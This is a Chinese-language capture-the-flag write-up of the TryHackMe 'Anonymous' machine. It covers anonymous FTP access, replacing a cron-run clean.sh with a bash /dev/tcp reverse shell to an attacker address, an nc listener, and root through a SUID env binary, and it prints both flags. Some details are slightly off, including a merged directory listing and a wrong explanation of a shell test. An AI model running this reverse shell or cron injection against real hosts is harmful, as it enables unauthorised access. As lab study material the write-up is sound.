# THM Anonymous 渗透测试详细 Writeup

## 基本信息
- **靶机名称**: Anonymous
- **平台**: TryHackMe
- **IP**: 10.49.186.207
- **难度**: Easy
- **主题**: 匿名/安全测试
- **完成日期**: 2026-06-12
- **总耗时**: ~20 分钟

---

## 信息搜集

### 1. Nmap 扫描

```bash
nmap -sC -sV -p- --min-rate=1000 10.49.186.207
```

**扫描结果**:
```
Nmap scan report for 10.49.186.207
Host is up (0.14s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.128.104
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)
|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)
|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 0s, deviation: 1s, median: -1s
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: anonymous
|   NetBIOS computer name: ANONYMOUS\x00
|   Domain name: \x00
|   FQDN: anonymous
|_  System time: 2026-06-12T07:44:26+00:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2026-06-12T07:44:25
|_  start_date: N/A
```

**分析**:
- 4 个开放端口: 21(FTP), 22(SSH), 139(SMB), 445(SMB)
- FTP 允许匿名登录，且 scripts 目录可写
- SMB 共享可能存在可利用资源
- Ubuntu 系统，OpenSSH 7.6p1

### 2. FTP 匿名登录

```bash
ftp -n 10.49.186.207
user anonymous anonymous
ls -la
```

**登录成功**:
```
Connected to 10.49.186.207.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||46897|).
150 Here comes the directory listing.
drwxr-xr-x    3 65534    65534        4096 May 13  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
drwxrwxrwx    2 111      113          4096 Jun 04  2020 scripts
drwxrwxrwx    2 111      113          4096 Jun 04  2020 .
drwxr-xr-x    3 65534    65534        4096 May 13  2020 ..
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1505 Jun 12 07:45 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

**关键发现**:
- scripts 目录可写 (drwxrwxrwx)
- clean.sh 可执行 (-rwxr-xr-x)
- to_do.txt 提示匿名登录不安全

### 3. SMB 枚举

```bash
smbclient -L 10.49.186.207
```

**结果**:
```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))
```

**访问 pics 共享**:
```bash
smbclient //10.49.186.207/pics
```

**内容**:
```
 .                                   D        0  Sun May 17 19:11:34 2020
  ..                                  D        0  Thu May 14 09:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 08:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 08:43:42 2020
```

---

## 初始访问

### 步骤 1: 分析 clean.sh

```bash
cat clean.sh
```

**内容**:
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

**关键漏洞**:
1. `if [ $tmp_files=0 ]` 应该是 `if [ $tmp_files -eq 0 ]`
2. 当前写法是赋值操作，永远为真
3. 更重要的是：这个脚本被 cron 定期执行
4. 我们有写权限，可以修改它

### 步骤 2: 修改 clean.sh 获取反向 Shell

**创建反向 shell 脚本**:
```bash
cat > /tmp/clean.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/192.168.128.104/4444 0>&1
EOF
```

**上传到 FTP**:
```bash
cd /tmp
ftp -n 10.49.186.207 <<EOF
user anonymous anonymous
cd scripts
put clean.sh
bye
EOF
```

**本地启动监听**:
```bash
nc -lvnp 4444
```

### 步骤 3: 获取 Shell

等待 cron 执行脚本...

**连接成功**:
```
listening on [any] 4444 ...
connect to [192.168.128.104] from (UNKNOWN) [10.49.186.207] 48704
bash: cannot set terminal process group (1651): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$
```

**用户**: namelessone
**主机**: anonymous

### 步骤 4: 稳定 Shell

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# 按 Ctrl+Z
stty raw -echo; fg
reset
xterm
```

---

## 权限提升

### 1. 获取 user.txt

```bash
cat /home/namelessone/user.txt
```

**结果**:
```
90d6f992585815ff991e68748c414740
```

**Flag 1 获取成功** ✅

### 2. 枚举系统信息

```bash
id
# uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

find / -perm -u=s 2>/dev/null
```

**关键发现**:
- 用户属于 sudo 组
- 用户属于 lxd 组（容器逃逸）
- /usr/bin/env 有 SUID 位
- /usr/bin/pkexec 有 SUID 位

### 3. env SUID 提权

**原理**:
- /usr/bin/env 有 SUID 位
- 可以执行任意命令并保留权限
- GTFOBins 中有详细利用方法

**利用**:
```bash
env /bin/bash -p
```

**结果**:
```bash
bash-4.4# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

bash-4.4# whoami
root
```

**提权成功** ✅

### 4. 获取 root.txt

```bash
cat /root/root.txt
```

**结果**:
```
4d930091c31a622a7ed10f27999af363
```

**Flag 2 获取成功** ✅

---

## 攻击路径可视化

```
[信息搜集]
  Nmap 扫描 → 发现 21/22/139/445
  
[FTP 枚举]
  匿名登录 → 发现 scripts 目录可写
  → 下载 clean.sh 分析
  
[Shell 获取]
  修改 clean.sh 添加反向 shell
  → 上传覆盖原文件
  → 启动 nc 监听
  → cron 执行 → 获取 namelessone shell
  
[权限提升]
  发现 /usr/bin/env SUID
  → env /bin/bash -p
  → root
  → 获取 root.txt
```

---

## 技术要点详细分析

### 1. FTP 匿名登录可写目录

**风险**:
- 匿名用户可写目录是严重安全风险
- 可以上传恶意文件、覆盖现有文件
- 常被用于 webshell 上传或计划任务注入

**检测**:
```bash
nmap --script ftp-anon 10.49.186.207
```

**利用**:
1. 登录 FTP
2. 找到可写目录
3. 上传恶意脚本或覆盖现有脚本

### 2. Cron 计划任务注入

**原理**:
- 系统定期执行特定脚本
- 如果脚本可被修改，就能执行任意代码
- 常见于 /etc/cron.* 目录或用户 crontab

**检测**:
```bash
cat /etc/crontab
ls -la /etc/cron.*
crontab -l
```

**利用**:
1. 找到被 cron 执行的脚本
2. 修改脚本添加恶意代码
3. 等待 cron 执行

### 3. env SUID 提权

**原理**:
- env 命令用于在修改后的环境中运行程序
- 如果有 SUID 位，可以保留 root 权限执行命令

**GTFOBins 利用**:
```bash
env /bin/sh -p
```

**其他 SUID 提权工具**:
- find
- vim
- less
- more
- nano
- cp
- mv

### 4. SMB 共享枚举

**工具**:
```bash
smbclient -L //10.49.186.207
enum4linux -a 10.49.186.207
smbmap -H 10.49.186.207
```

**常见共享**:
- IPC$ - 管道共享，用于远程管理
- print$ - 打印机驱动
- 用户自定义共享

---

## 发现的凭证汇总

| 服务  | 用户名      | 密码      | 来源       | 用途         |
| ----- | ----------- | --------- | ---------- | ------------ |
| FTP   | anonymous   | anonymous | 匿名登录   | 上传恶意脚本 |
| Shell | namelessone | N/A       | FTP + cron | 初始访问     |

---

## 工具使用汇总

| 工具      | 用途       | 命令示例                                          |
| --------- | ---------- | ------------------------------------------------- |
| nmap      | 端口扫描   | `nmap -sC -sV -p- 10.49.186.207`                  |
| ftp       | FTP 客户端 | `ftp -n 10.49.186.207`                            |
| smbclient | SMB 客户端 | `smbclient -L //10.49.186.207`                    |
| nc        | 网络监听   | `nc -lvnp 4444`                                   |
| find      | SUID 查找  | `find / -perm -u=s 2>/dev/null`                   |
| env       | SUID 提权  | `env /bin/bash -p`                                |
| python3   | Shell 稳定 | `python3 -c 'import pty; pty.spawn("/bin/bash")'` |

---

## 参考与资源

### 靶机信息
- **平台**: TryHackMe
- **难度**: Easy
- **主题**: 匿名/安全测试

### 技术参考
- **GTFOBins**: https://gtfobins.github.io/
- **vsftpd**: https://security.appspot.com/vsftpd.html
- **Samba**: https://www.samba.org/
- **Cron**: https://man7.org/linux/man-pages/man8/cron.8.html

---

## 完成状态

- ✅ **user.txt**: `90d6f992585815ff991e68748c414740`
  - 位置: /home/namelessone/user.txt

- ✅ **root.txt**: `4d930091c31a622a7ed10f27999af363`
  - 位置: /root/root.txt

- ✅ **总耗时**: ~20 分钟
- ✅ **难度**: Easy
- ✅ **完成日期**: 2026-06-12
